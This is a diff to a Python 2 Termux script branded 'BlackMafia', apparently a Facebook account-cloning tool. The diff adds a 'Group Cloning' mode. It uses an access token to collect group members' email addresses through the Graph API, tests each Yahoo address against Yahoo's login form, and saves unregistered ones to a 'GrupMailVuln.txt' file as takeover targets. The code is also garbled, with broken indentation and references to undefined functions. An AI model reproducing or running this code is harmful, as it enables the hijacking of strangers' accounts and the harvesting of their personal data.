@@ -287,9 +287,9 @@ def login():
                 jalan(' \033[1;91m────────╚═╬╝╔╬╬╗╚╬═╝────────')
                 jalan(' \033[1;91m──────────╚═╬╝╚╬═╝──────────')
                 jalan(' \033[1;91m────────────╚══╝────────────')
-	        jalan(' \033[1;93m●: \033[1;95mGet Access Token App install Old Version v 2.1' )
+	        jalan(' \033[1;93m●: \033[1;95m lovehacker' )
 	        jalan(' \033[1;93m●: \033[1;95mFacebook login Old&New Acount No Checkpoint ' )
-	        jalan(' \033[1;93m●: \033[1;95mTermux  All version Work✅ Token paste 👇' )
+	        jalan(' \033[1;93m●: \033[1;95mTermux  All version Work✅  👇' )
 	        print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 	        print('\033[1;91m▬\x1b[1;95m.....LOGIN WITH FACEBOOK Token....\x1b[1;91m▬' )
 	        print('	' )
@@ -389,11 +389,11 @@ def menu():
 	print "	   \033[1;91m Name\033[1;91m:\033[1;91m"+nama+"\033[1;95m               "
 	print "	   \033[1;91m ID\033[1;91m:\033[1;91m"+id+"\x1b[1;95m              "
 	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;95mBlackMafia\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;92m-•◈•-\033[1;91m> \033[1;95m1.\x1b[1;96mStart Cloning..."
+	print "\033[1;92m-•◈•-\033[1;91m> \033[1;95m1.\x1b[1;96m Start Cloning..."
         print "\033[1;92m-•◈•-\033[1;91m> \033[1;95m2.\033[1;96m Show token"
         print "\033[1;92m-•◈•-\033[1;91m> \033[1;95m3.\033[1;96m Login using Another token"
         print "\033[1;92m-•◈•-\033[1;91m> \033[1;95m4.\033[1;96m WhatsApp Group BlackMafia"
-	print "\033[1;91m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mlogout            "
+	print "\033[1;91m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m logout            "
 	pilih()
 
 
@@ -439,6 +439,7 @@ def super():
 	print logo
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95mClone From Friend List."
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95mClone Friend List Public ID."
+        print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m3.\x1b[1;95mGroup Cloning."
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_super()
 
@@ -470,10 +471,65 @@ def pilih_super():
 			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 			super()
 		print"\033[1;91mGetting IDs\033[1;97m..."
-		otw = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		a = json.loads(otw.text)
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
+        elif peak =="3":
+                os.system('reset')
+	        print logo
+	        mpsh = []
+	        jml = 0
+	        id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+	        try:
+		        r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+		        asw=json.loads(r.text)
+		        print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+	        except KeyError:
+		        print"\033[1;91m[!] Group not found"
+		        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		        menu_yahoo()
+	        jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
+	        teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+	        kimak = json.loads(teman.text)
+	        save = open('out/GrupMailVuln.txt','w')
+	        jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	        print 42*"\033[1;97m═"
+	        for w in kimak['data']:
+		jml +=1
+		mpsh.append(jml)
+		id = w['id']
+		nama = w['name']
+		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		z = json.loads(links.text)
+		try:
+			mail = z['email']
+			yahoo = re.compile(r'@.*')
+			otw = yahoo.search(mail).group()
+			if 'yahoo.com' in otw:
+				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+				br._factory.is_html = True
+				br.select_form(nr=0)
+				br["username"] = mail
+				klik = br.submit().read()
+				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+				try:
+					pek = jok.search(klik).group()
+				except:
+					continue
+				if '"messages.ERROR_INVALID_USERNAME">' in pek:
+					save.write(mail + '\n')
+					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
+					berhasil.append(mail)
+		except KeyError:
+			pass
+	print 42*"\033[1;97m●"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	save.close()
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_yahoo()
 	elif peak =="0":
 		menu()
 	else:
